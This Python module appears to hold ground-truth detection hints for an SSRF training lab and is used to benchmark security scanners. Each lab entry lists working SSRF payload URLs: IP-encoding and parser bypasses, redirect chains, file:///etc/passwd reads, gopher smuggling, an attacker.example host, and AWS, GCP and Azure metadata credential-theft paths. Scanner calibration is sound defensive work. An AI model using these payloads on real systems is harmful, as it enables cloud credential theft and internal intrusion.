"""Per-lab detection hints — what a scanner *should* report for each lab.

Exposed via /meta/<slug> on ssrf.vulnlab.dev. Lets you benchmark a SAST/DAST
tool's output against ground truth: a tool gets credit if its findings line
up with the (cwe, subtype, sinks, success_markers) declared here.

Kept in one file on purpose. Keeps the source of truth easy to scan when
calibrating a scanner; the lab modules stay focused on the bug itself.
"""
from __future__ import annotations

CWE_SSRF = "CWE-918"
OWASP_2021 = "A10:2021 — Server-Side Request Forgery"

DETECT_HINTS: dict[str, dict] = {
    "basic": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "unvalidated-url-fetch",
        "sinks": ["requests.get"],
        "exploit_examples": [
            "/basic/?url=http://127.0.0.1:8089/secret",
        ],
        "success_markers": ["VULNLAB{ssrf-reached-internal-service}"],
        "tags": ["no-validation", "loopback-reachable"],
        "scanner_should_fire": True,
    },
    "blocklist": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "substring-blocklist-bypass",
        "sinks": ["urllib.request.urlopen"],
        "exploit_examples": [
            "/blocklist/?url=http://2130706433:8089/secret",
            "/blocklist/?url=http://0x7f.0x0.0x0.0x1:8089/secret",
            "/blocklist/?url=http://[::ffff:127.0.0.1]:8089/secret",
        ],
        "success_markers": ["VULNLAB{ssrf-reached-internal-service}"],
        "tags": ["ipv4-alt-forms", "ipv6-mapped", "decimal-ip", "hex-ip"],
        "scanner_should_fire": True,
    },
    "allowlist": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "substring-allowlist-bypass",
        "sinks": ["requests.get"],
        "exploit_examples": [
            "/allowlist/?url=http://127.0.0.1:8089/secret?x=vulnlab.dev",
            "/allowlist/?url=http://attacker.example/vulnlab.dev",
        ],
        "success_markers": ["VULNLAB{ssrf-reached-internal-service}"],
        "tags": ["weak-validator", "substring-in-path", "substring-in-query"],
        "scanner_should_fire": True,
    },
    "parser": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "url-parser-disagreement",
        "sinks": ["requests.get"],
        "exploit_examples": [
            "/parser/?url=http://images.vulnlab.dev@127.0.0.1:8089/secret",
        ],
        "success_markers": ["VULNLAB{ssrf-reached-internal-service}"],
        "tags": ["userinfo", "regex-host-extract", "validator-fetcher-mismatch"],
        "scanner_should_fire": True,
    },
    "redirect": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "follow-redirect-on-allowlisted-host",
        "sinks": ["requests.get(allow_redirects=True)"],
        "exploit_examples": [
            "/redirect/?url=https://ssrf.vulnlab.dev/r/?to=http://127.0.0.1:8089/secret",
        ],
        "success_markers": ["VULNLAB{ssrf-reached-internal-service}"],
        "tags": ["open-redirect-chain", "host-allowlist", "302-follow"],
        "scanner_should_fire": True,
    },
    "scheme": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "unrestricted-url-scheme",
        "sinks": ["urllib.request.urlopen"],
        "exploit_examples": [
            "/scheme/?url=file:///etc/passwd",
            "/scheme/?url=file:///etc/vulnlab/flag.txt",
        ],
        "success_markers": ["root:x:0:0", "VULNLAB{"],
        "tags": ["file-scheme", "local-file-read"],
        "scanner_should_fire": True,
    },
    "blind": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "blind-no-response-feedback",
        "sinks": ["httpx.get"],
        "exploit_examples": [
            "/blind/?url=http://<your-oast-domain>/probe",
        ],
        "success_markers": [],
        "tags": ["blind", "oob-required", "oast"],
        "scanner_should_fire": True,
        "notes": (
            "Detection requires out-of-band callback (Burp Collaborator, "
            "interactsh, outofbits.com). No response-body signal exists."
        ),
    },
    "webhook": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "semi-blind-header-leak",
        "sinks": ["requests.post"],
        "exploit_examples": [
            "/webhook/?url=http://127.0.0.1:8089/webhook-callback",
        ],
        "success_markers": ["VULNLAB{ssrf-webhook-leaked-via-headers}"],
        "tags": ["post", "header-echo", "semi-blind", "content-length-leak"],
        "scanner_should_fire": True,
    },
    "metadata": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "cloud-metadata-aws-imdsv1",
        "sinks": ["requests.get"],
        "exploit_examples": [
            "/metadata/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/vulnlab-imds-test-role",
            "/metadata/?url=http://169.254.169.254/latest/user-data",
        ],
        "success_markers": [
            "AKIAIOSFODNN7EXAMPLE",
            "VULNLAB{user-data-leaked-via-ssrf}",
        ],
        "tags": ["aws-imds", "cloud-metadata", "link-local"],
        "scanner_should_fire": True,
    },
    "metadata-gcp": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "cloud-metadata-gcp",
        "sinks": ["requests.get with injected Metadata-Flavor: Google"],
        "exploit_examples": [
            "/metadata-gcp/?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",
        ],
        "success_markers": ["VULNLAB{ssrf-gcp-metadata-token-leaked}"],
        "tags": ["gcp-metadata", "cloud-metadata", "header-flavor-injected"],
        "scanner_should_fire": True,
        "notes": (
            "AWS-only scanners typically miss this; the app already supplies "
            "the required Metadata-Flavor header."
        ),
    },
    "metadata-azure": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "cloud-metadata-azure",
        "sinks": ["requests.get with injected Metadata: true"],
        "exploit_examples": [
            "/metadata-azure/?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "success_markers": ["VULNLAB{ssrf-azure-msi-token-leaked}"],
        "tags": ["azure-imds", "cloud-metadata", "msi", "header-metadata-true"],
        "scanner_should_fire": True,
    },
    "gopher": {
        "cwe": CWE_SSRF,
        "owasp": OWASP_2021,
        "subtype": "gopher-protocol-smuggling",
        "sinks": ["pycurl (libcurl)"],
        "exploit_examples": [
            "/gopher/?url=gopher://127.0.0.1:6479/_PING%0d%0a",
        ],
        "success_markers": ["VULNLAB{ssrf-gopher-pivot-to-redis-like-service}"],
        "tags": ["gopher", "libcurl", "tcp-pivot", "non-http-pivot"],
        "scanner_should_fire": True,
    },
}
